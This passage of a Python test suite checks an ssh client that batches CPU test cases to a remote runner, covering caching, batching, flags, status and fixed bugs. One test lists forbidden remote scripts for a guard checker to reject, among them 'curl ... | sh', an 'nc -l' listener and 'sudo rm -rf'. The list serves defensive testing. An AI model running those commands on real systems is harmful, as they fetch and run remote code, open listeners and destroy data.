            self.assertEqual(off[i].outcome, client.NO_ANSWER)
        # ask again with the faults gone and --allow-unchecked: exactly the six that were not stored go out
        self.knobs(timeout_cases=None, killed_cases=None, outcome_cases=None)
        n = len(self.batches())
        res = self.oracle().run(cases, allow_unchecked=True)
        again = self.batches()[n:]
        self.assertEqual(len(again), 1)
        self.assertEqual(again[0]["case_keys"], [cases[i].key().hex() for i in (3, 4, 5, 6, 7, 8)])
        self.assertIn("--allow-unchecked", again[0]["args"])
        for i in (3, 4, 5, 6, 7, 8):
            self.assertEqual((res[i].outcome, res[i].detail), (client.DONE, 0), i)
        for i in stored:                                     # the stored ones were not asked again
            self.assertTrue(res[i].cached)
            self.assertEqual((res[i].outcome, res[i].detail), got[i])
        self.assertEqual(self.is_cached(cases), [True] * 10)

    def test_a_refused_unchecked_case_is_not_remembered_for_the_run_that_allows_it(self):
        regions = data_set()
        c = client.Case(regions, client.CODE_ADDR, gpr=client.gpr_list(rax=1), unchecked=True)
        res = self.oracle().run([c])
        self.assertEqual((res[0].outcome, res[0].detail), (client.REFUSED, 34))
        self.assertEqual(self.is_cached([c]), [False])
        res = self.oracle().run([c], allow_unchecked=True)
        self.check_answer(c, res[0])
        self.assertEqual(self.is_cached([c]), [True])

    # ---- E.11 ----

    def test_refresh_asks_again_and_equal_answers_are_no_conflict(self):
        cases = cases_for(data_set(), 3)
        ora = self.oracle()
        first = ora.run(cases)
        self.assertEqual(len(self.batches()), 1)
        again = ora.run(cases, refresh=True)
        self.assertEqual(len(self.batches()), 2)
        for a, b in zip(first, again):
            self.assertEqual(a.raw, b.raw)
            self.assertFalse(b.cached)
        self.assertEqual(self.batches()[1]["case_keys"], self.batches()[0]["case_keys"])
        self.assert_cache_clean()

    def test_refresh_with_a_different_batch_composition_is_no_conflict(self):
        a, b, c = cases_for(data_set(), 3)
        ora = self.oracle()
        first = ora.run([a, b, c])
        second = ora.run([c, a], refresh=True)         # c was third in the first batch, now first; a first, now second
        self.assertEqual(self.batches()[1]["case_keys"], [c.key().hex(), a.key().hex()])
        self.assertEqual(second[0].raw, first[2].raw)
        self.assertEqual(second[1].raw, first[0].raw)
        self.assertEqual(len(cachemod.Cache(self.cache_root, "tests")), 3)
        self.assert_cache_clean()

    def test_the_same_case_at_two_batch_positions_has_identical_raw_bytes(self):
        a, b, c = cases_for(data_set(), 3)
        first = self.oracle().run([a, b, c])
        other_root = tempfile.mkdtemp(prefix="cache2-", dir=self.tmp)
        alone = self.oracle(cache_root=other_root).run([c])
        self.assertEqual(first[2].raw, alone[0].raw)
        for r in first:
            self.assertEqual(r.raw[4:8], bytes(4))

    def test_the_wire_carries_true_positions_and_the_stored_bytes_carry_zero(self):
        cases = cases_for(data_set(), 4)
        with mock.patch.object(client, "parse_results", wraps=client.parse_results) as spy:
            res = self.oracle().run(cases)
        data = spy.call_args_list[0].args[0]
        pos, idx = client.RESULT_HDR.size, []
        for _ in cases:
            n, i = struct.unpack_from("<II", data, pos)
            idx.append(i)
            pos += 4 + n
        self.assertEqual(idx, [0, 1, 2, 3])
        self.assertEqual(struct.unpack_from("<II", data, pos), (client.MAGIC_END_OUT, 4))
        for r in res:
            self.assertEqual(struct.unpack_from("<I", r.raw, 4)[0], 0)
        # and the stand-in's index check bites: out-of-order records are refused by parse_results
        swapped = bytearray(data)
        struct.pack_into("<I", swapped, client.RESULT_HDR.size + 4, 9)
        with self.assertRaises(client.OracleUnavailable):
            client.parse_results(bytes(swapped), 4)

    def test_refresh_with_a_different_answer_is_a_conflict_and_changes_nothing(self):
        cases = cases_for(data_set(), 3)
        first = self.oracle().run(cases)
        self.knobs(answer_salt="another CPU")
        ora = self.oracle()
        with self.assertRaises(cachemod.CacheConflict) as cm:
            ora.run(cases, refresh=True)
        self.assertTrue(cm.exception.conflicts)
        self.assertEqual(len(self.batches()), 2)                      # it did ask
        off = self.offline(cases)
        for a, b in zip(first, off):
            self.assertEqual(a.raw, b.raw)
            self.assertTrue(b.cached)
        self.assert_cache_clean()
        # without refresh the cached answer is simply used, whatever the machine would say now
        res = self.oracle().run(cases)
        self.assertEqual(len(self.batches()), 2)
        self.assertEqual([r.raw for r in res], [r.raw for r in first])

    def test_answers_that_differ_in_the_salt_really_differ(self):
        cases = cases_for(data_set(), 2)
        a = self.oracle(use_cache=False).run(cases)
        self.knobs(answer_salt="s")
        b = self.oracle(use_cache=False).run(cases)
        self.assertNotEqual(a[0].raw, b[0].raw)
        self.check_answer(cases[0], b[0], b"s")

    # ---- E.12 ----

    def test_many_cases_make_several_batches_and_come_back_in_order(self):
        rng = random.Random(12)
        sets = [data_set(code=bytes([0x90, i])) for i in range(4)]
        cases = []
        for i in range(60):
            s = i % 4
            cases.append(client.Case(sets[s], client.CODE_ADDR, gpr=client.gpr_list(rax=i, rcx=s), max_insns=2,
                                     gs_base=0x5000 if i % 3 == 0 else 0, tag=(s, i)))
        order = list(range(60))
        rng.shuffle(order)
        cases = [cases[i] for i in order]
        seen = []
        ora = self.oracle(batch_seconds=0.3)
        res = ora.run(cases, progress=seen.append)
        batches = self.batches()
        self.assertGreaterEqual(len(batches), 12)
        self.assertEqual(sum(b["n_cases"] for b in batches), 60)
        self.assertLessEqual(max(b["n_cases"] for b in batches), 6)
        self.assertEqual(seen, [b["n_cases"] for b in batches])
        for c, r in zip(cases, res):
            self.check_answer(c, r)
        sent = [k for b in batches for k in b["case_keys"]]
        self.assertEqual(sorted(sent), sorted(c.key().hex() for c in cases))
        by_key = {c.key().hex(): c for c in cases}
        # cases that share memory stay together: each region set is one run in the sequence of sent cases
        runs = []
        for k in sent:
            s = client.regionset_key(by_key[k].regions)
            if not runs or runs[-1] != s:
                runs.append(s)
        self.assertEqual(len(runs), 4)
        # within one set and one gs base the caller's order is kept
        pos = {c.key().hex(): i for i, c in enumerate(cases)}
        groups = {}
        for k in sent:
            c = by_key[k]
            groups.setdefault((client.regionset_key(c.regions), c.gs_base), []).append(pos[k])
        for g in groups.values():
            self.assertEqual(g, sorted(g))
        self.assertEqual(self.is_cached(cases), [True] * 60)

    def test_a_batch_is_also_split_by_size(self):
        regions = (client.code_region(b"\x90"), client.Region(client.DATA_ADDR, None, R | W, size=0x100000))
        rng = random.Random(5)
        cases = [client.Case(regions, client.CODE_ADDR, gpr=client.gpr_list(rax=i),
                             pokes=[(client.DATA_ADDR, rng.randbytes(900000))]) for i in range(8)]
        res = self.oracle().run(cases)
        batches = self.batches()
        self.assertGreaterEqual(len(batches), 2)
        self.assertEqual(sum(b["n_cases"] for b in batches), 8)
        self.assertLessEqual(max(b["stdin_len"] for b in batches), (6 << 20) + 900000 + 200000)
        for c, r in zip(cases, res):
            self.check_answer(c, r)

    # ---- E.13 ----

    def test_flags_and_limits_reach_the_runner(self):
        ora = self.oracle(time_limit_ms=1500, group_size=17)
        ora.run(cases_for(data_set(), 3))
        ora.run(cases_for(data_set(), 3, start=10), allow_unchecked=True)
        ora.run(cases_for(data_set(), 3, start=20), isolate=True)
        plain, unchecked, isolated = self.batches()
        self.assertNotIn("--allow-unchecked", plain["script"])
        self.assertNotIn("--allow-unchecked", plain["args"])
        self.assertIn("--allow-unchecked", unchecked["script"])
        self.assertEqual(unchecked["args"], "--blobs blobs --allow-unchecked")
        self.assertNotIn("--allow-unchecked", isolated["args"])
        self.assertIn("--blobs blobs", plain["args"])
        self.assertEqual(plain["header"]["group_size"], 17)
        self.assertEqual(unchecked["header"]["group_size"], 17)
        self.assertEqual(isolated["header"]["group_size"], 1)
        for b in (plain, unchecked, isolated):
            self.assertEqual(b["header"]["time_limit_ms"], 1500)
            self.assertEqual(b["header"]["version"], client.FORMAT_VERSION)
            limit = b["header"]["batch_limit_s"]
            self.assertTrue(60 <= limit <= 600)
            self.assertIn("timeout -k 2 %d " % (limit + 5), b["script"])
        default = self.oracle(family="default")
        default.run(cases_for(data_set(), 2, start=40))
        self.assertEqual(self.batches()[-1]["header"]["group_size"], 64)
        self.assertEqual(self.batches()[-1]["header"]["time_limit_ms"], 2000)

    def test_the_batch_limit_grows_with_the_work_and_is_capped(self):
        ora = self.oracle(time_limit_ms=60000, use_cache=False)
        ora.run(cases_for(data_set(), 300))
        self.assertEqual(self.batches()[0]["header"]["batch_limit_s"], 60 + int(300 * 60 * 0.02))

    # ---- E.14 ----

    def test_status(self):
        ora = self.oracle()
        h = ora.status()
        self.assertEqual(self.kinds(), ["runner97", "build", "runner"])
        self.assertEqual(h["status"], 0)
        self.assertEqual(h["message"], "self-test passed")
        self.assertEqual((h["cpu"], h["runner_build"]), ("Fake CPU", client.RUNNER_HASH))
        self.assertEqual((h["answers_rev"], h["version"], h["n"]), (client.ANSWERS_REV, client.FORMAT_VERSION, 0))
        self.assertTrue(h["aslr_off"] and h["fsgsbase"])
        self.assertIn("--selftest", self.log()[-1]["args"])
        self.assertEqual(self.log()[-1]["stdin_len"], 0)

    def test_status_with_a_failing_self_test(self):
        self.knobs(selftest_fails=True)
        h = self.oracle().status()
        self.assertNotEqual(h["status"], 0)
        self.assertIn("self-test", h["message"])

    def run_cli(self, *argv):
        out, err = io.StringIO(), io.StringIO()
        with mock.patch.object(sys, "argv", ["client.py"] + list(argv) + ["--host", "fake@fake-host"]), \
                contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = client.main()
        return code, out.getvalue(), err.getvalue()

    def test_command_line_exit_codes(self):
        code, out, _ = self.run_cli("status")
        self.assertEqual(code, 0)
        self.assertIn("self-test passed", out)
        self.assertIn(client.RUNNER_HASH, out)
        self.assertIn("Fake CPU", out)
        code, out, _ = self.run_cli("ps")
        self.assertEqual(code, 0)
        self.assertIn("nothing of ours", out)
        self.knobs(ps_lines=["1234 exe=/home/x/tf2-hw-oracle/bin/runner cwd=/home/x/tf2-hw-oracle"])
        code, out, _ = self.run_cli("ps")
        self.assertEqual(code, 1)
        self.assertIn("1234", out)
        self.knobs(ps_lines=None)
        code, out, _ = self.run_cli("remote-ls")
        self.assertEqual(code, 0)
        self.assertIn("bin/runner-" + client.RUNNER_HASH, out)
        code, out, _ = self.run_cli("purge")
        self.assertEqual(code, 0)
        code, out, _ = self.run_cli("remote-ls")
        self.assertNotIn("runner-", out)
        self.knobs(selftest_fails=True)
        self.assertEqual(self.run_cli("status")[0], 1)
        self.knobs(selftest_fails=None, build_warns=True)
        self.run_cli("purge")
        code, _, err = self.run_cli("build")
        self.assertEqual(code, 4)
        self.assertIn("oracle error", err)
        self.knobs(build_warns=None, unreachable=True)
        code, _, err = self.run_cli("status")
        self.assertEqual(code, 3)
        self.assertIn("unavailable", err)

    def test_remote_helpers(self):
        ora = self.oracle()
        self.assertIn("no tf2-hw-oracle directory", ora.remote_listing())
        self.assertEqual(ora.remote_processes(), [])
        self.knobs(ps_lines=["10 exe=a cwd=b", "", "11 exe=c cwd=d"])
        self.assertEqual(ora.remote_processes(), ["10 exe=a cwd=b", "11 exe=c cwd=d"])
        blob, regions = self.big_regions(seed=11)
        ora.run(cases_for(regions, 2))
        listing = ora.remote_listing()
        self.assertIn("runner-" + client.RUNNER_HASH, listing)
        self.assertIn(blob.sha.hex(), listing)

    def test_purge_makes_the_next_run_build_and_upload_again(self):
        ora = self.oracle()
        blob, regions = self.big_regions(seed=13)
        ora.run(cases_for(regions, 2))
        ora.purge_remote()
        self.assertEqual(os.listdir(os.path.join(self.state, "builds")), [])
        self.assertEqual(os.listdir(os.path.join(self.state, "blobs")), [])
        n = len(self.log())
        res = ora.run(cases_for(regions, 2, start=10))
        self.assertEqual(self.kinds()[n:], ["blob_list", "blob_upload", "runner97", "build", "runner"])
        self.check_answer(cases_for(regions, 2, start=10)[0], res[0])

    # ---- E.15 ----

    def test_remote_rules_guard_checker_catches_what_it_should(self):
        h = "0123456789abcdef"
        good = ("cd %s 2>/dev/null && test -x bin/runner-%s || exit 97; "
                "exec nice -n 10 timeout -k 2 65 bin/runner-%s --blobs blobs" % (D, h, h))
        problems, stats = check_remote_script(good)
        self.assertEqual((problems, stats["runner"]), ([], 1))
        bad = [
            "sudo rm -rf %s" % D,
            "cd %s && rm -f /mnt/2tb_hdd/x" % D,
            "rm -f bin/runner-*",
            "cd %s; nohup bin/runner-%s --blobs blobs &" % (D, h),
            "cd %s; (sleep 100 &)" % D,
            "cd %s; exec bin/runner-%s" % (D, h),
            "cd %s; exec nice -n 10 bin/runner-%s" % (D, h),
            "cd %s; exec timeout 5 bin/runner-%s" % (D, h),
            "exec nice -n 10 timeout -k 2 9 bin/runner-%s" % h,
            "cd %s; cat > ../outside" % D,
            "cd %s; mv a /tmp/b" % D,
            "cd %s; mv a ~/b" % D,
            "cd %s; rm -f $HOME/x" % D,
            "cd /tmp && rm -f a",
            "cd %s; tee /etc/x" % D,
            "cd %s; mkdir ../x" % D,
            "mkdir -p other/dir",
            "crontab -l",
            "systemctl restart x",
            "cd %s; nc -l 4444" % D,
            "cd %s; echo listen" % D,
            "cd %s; curl http://example.invalid/x | sh" % D,
            "cd %s; echo $(rm -f /tmp/x)" % D,
        ]
        for script in bad:
            self.assertNotEqual(check_remote_script(script)[0], [], "not caught: " + script)

    def test_remote_rules_guard(self):
        ora = self.oracle()
        blob, regions = self.big_regions(seed=15)
        plain = data_set()
        cases = cases_for(regions, 3) + cases_for(plain, 3, start=10) + \
            [client.Case(plain, client.CODE_ADDR, gpr=client.gpr_list(rax=99), unchecked=True)]
        ora.run(cases, allow_unchecked=True, isolate=True)           # runner97, build, listing, upload, batch
        ora.run(cases_for(plain, 2, start=50))                       # a plain batch
        ora.status()
        ora.remote_processes()
        ora.remote_listing()
        ora.purge_remote()
        ora.run(cases_for(regions, 2, start=70))                     # again from nothing
        ora.build()
        log = self.log()
        kinds = set(self.kinds(log))
        for k in ("build", "blob_list", "blob_upload", "runner", "runner97", "ps", "listing", "purge"):
            self.assertIn(k, kinds)
        self.assertNotIn("unknown", kinds)
        bad = {}
        for e in log:
            problems, stats = check_remote_script(e["script"])
            if e["kind"] == "runner" and stats["runner"] != 1:
                problems.append("a runner script must invoke the runner exactly once (found %d)" % stats["runner"])
            if e["kind"] == "build" and stats["gcc"] != 1:
                problems.append("the build script must invoke gcc exactly once (found %d)" % stats["gcc"])
            if problems:
                bad[e["script"]] = problems
        self.assertEqual(bad, {}, "remote scripts that break the rules:\n" + "\n".join(
            "  %s\n    -> %s" % (s, "; ".join(p)) for s, p in bad.items()))
        for e in log:                                                  # ssh itself: no prompts, a connect timeout
            self.assertIn("BatchMode=yes", e["argv"])
            self.assertIn("-C", e["argv"])
            self.assertEqual(e["argv"][-1], "fake@fake-host")


# ============================================================================ the fake itself

class FakeSshSelfTests(FakeSshMixin, unittest.TestCase):
    def call(self, script, stdin=b""):
        return subprocess.run([self.ssh, "-o", "BatchMode=yes", "fake@fake-host", script], input=stdin,
                              capture_output=True, timeout=30)

    def test_upload_checks_the_hash_like_the_real_script(self):
        ora = self.oracle()
        blob = client.Blob(b"x" * 100)
        ora._ensure_blobs([blob])
        script = self.log()[-1]["script"]
        self.assertEqual(self.log()[-1]["kind"], "blob_upload")
        p = self.call(script, b"y" * 100)
        self.assertEqual(p.returncode, 9)
        self.assertIn("sha256 mismatch", self.log()[-1]["note"])
        other = client.Blob(b"z" * 10)
        script2 = script.replace(blob.sha.hex(), other.sha.hex())
        self.assertEqual(self.call(script2, other.data).returncode, 0)
        self.assertEqual(sorted(os.listdir(os.path.join(self.state, "blobs"))), sorted([blob.sha.hex(), other.sha.hex()]))

    def test_unknown_scripts_and_missing_state(self):
        self.assertEqual(self.call("echo hello").returncode, 127)
        self.assertEqual(self.log()[-1]["kind"], "unknown")
        with mock.patch.dict(os.environ, {"FAKE_SSH_STATE": os.path.join(self.tmp, "nope")}):
            self.assertEqual(self.call("echo hello").returncode, 99)

    def test_the_build_checks_that_the_source_matches_its_hash(self):
        ora = self.oracle()
        ora.build()
        script = self.log()[-1]["script"]
        self.assertEqual(self.log()[-1]["exit"], 0)
        p = self.call(script, b"not the source")
        self.assertEqual(p.returncode, 1)
        self.assertIn("build hash mismatch", self.log()[-1]["note"])

    def test_runner_without_a_build_exits_97_before_reading(self):
        ora = self.oracle()
        script = ("cd {d} 2>/dev/null && test -x bin/runner-{h} || exit 97; exec nice -n 10 timeout -k 2 9 "
                  "bin/runner-{h} --selftest").format(d=D, h=client.RUNNER_HASH)
        p = self.call(script)
        self.assertEqual((p.returncode, p.stdout), (97, b""))
        self.assertEqual(self.kinds(), ["runner97"])
        del ora


# =============================================================================== the findings

class Findings(FakeSshMixin, unittest.TestCase):
    """Each test here fails today because of a bug in client.py; none has been weakened or skipped."""

    def test_finding_1_case_key_goes_stale_when_a_case_is_changed(self):
        # Was a bug (fixed: the key is computed afresh every time).  Case.key() cached its value in _key but a
        # Case is mutable (gpr is a list, xmm/rip/... are plain
        # attributes), so a case changed after it was first used gets the cached answer of the OLD question.
        regions = data_set()
        c = client.Case(regions, client.CODE_ADDR, gpr=client.gpr_list(rax=1))
        ora = self.oracle()
        first = ora.run([c])[0]
        self.check_answer(c, first)
        c.gpr[0] = 2                                       # the question is now a different one
        second = ora.run([c])[0]
        self.assertEqual(len(self.batches()), 2, "the changed case was answered from the cache (stale key)")
        self.check_answer(c, second)

    def test_finding_2_an_offline_oracle_stays_offline_whatever_a_call_asks(self):
        # Was a bug: run(offline=False) on an Oracle made with offline=True raised OracleUnavailable.  Decision of
        # the client's author: an Oracle made offline never opens ssh; a call can only add offline, not remove it.
        cases = cases_for(data_set(), 2)
        ora = self.oracle(offline=True)
        res = ora.run(cases, offline=False)
        self.assertTrue(all(r.outcome == client.NO_ANSWER for r in res))
        self.assertEqual(ora.ssh_calls, 0)
        self.assertEqual(self.kinds(), [])

    def test_finding_3_initial_mem_of_a_range_across_two_adjacent_regions_is_none(self):
        # Was a bug (fixed): initial_mem looked for ONE region holding the whole range.
        A = 0x10000000
        r1 = client.Region(A, bytes(range(256)) * 16, R | W)                  # 0x1000 bytes
        r2 = client.Region(A + 0x1000, bytes(range(255, -1, -1)) * 16, R | W)
        c = client.Case((r1, r2), A, pokes=[(A + 0xFFE, b"PQRS")])
        got = client.initial_mem(c, A + 0xFF0, 0x20)
        want = bytearray(r1.blob.data[0xFF0:] + r2.blob.data[:0x10])
        want[0xE:0x12] = b"PQRS"
        self.assertEqual(got, bytes(want))

    def test_finding_4_a_record_whose_masks_promise_more_than_it_holds_is_not_an_oracle_error(self):
        # Was a bug (fixed): a record that says "rax changed" but holds no value raised struct.error, not
        # OracleError (which says "the runner's output is malformed").
        c = client.Case((), 0)
        promises = {"a general register": (0x0001, 0, 0), "an xmm register": (0, 0x0001, 0),
                    "a memory run": (0, 0, 1)}
        for what, (gmask, xmask, n_mem) in promises.items():
            raw = client.RES_HDR.pack(client.RES_HDR.size - 4, 0, client.DONE, 0, 0, 0, 0, 0, 0, 1, 2, 0x1F80, 1,
                                      gmask, xmask, n_mem)
            try:
                client.decode_result(raw, c)
            except client.OracleError:
                continue
            except Exception as e:                       # noqa: BLE001
                self.fail("a record promising %s and holding none raised %s: %s" % (what, type(e).__name__, e))
            self.fail("a record promising %s and holding none was accepted" % what)

    def test_finding_5_region_set_keys_are_never_released(self):
        # Was a bug (fixed: no module-level table any more).  regionset_key() kept every region tuple it had
        # seen, with all its bytes, in the module
        # dict _SET_KEYS for the life of the process; a Case built from a list makes a new tuple each time.
        cache = getattr(client, "_SET_KEYS", {})
        before = len(cache)
        for i in range(60):
            c = client.Case([client.Region(client.DATA_ADDR, bytes([i]) * 100, R)], 0)
            c.key()
        del c
        gc.collect()
        self.assertLess(len(getattr(client, "_SET_KEYS", {})) - before, 5,
                        "60 throw-away cases left %d region sets alive" % (len(getattr(client, "_SET_KEYS", {})) - before))


if __name__ == "__main__":
    unittest.main(verbosity=2)
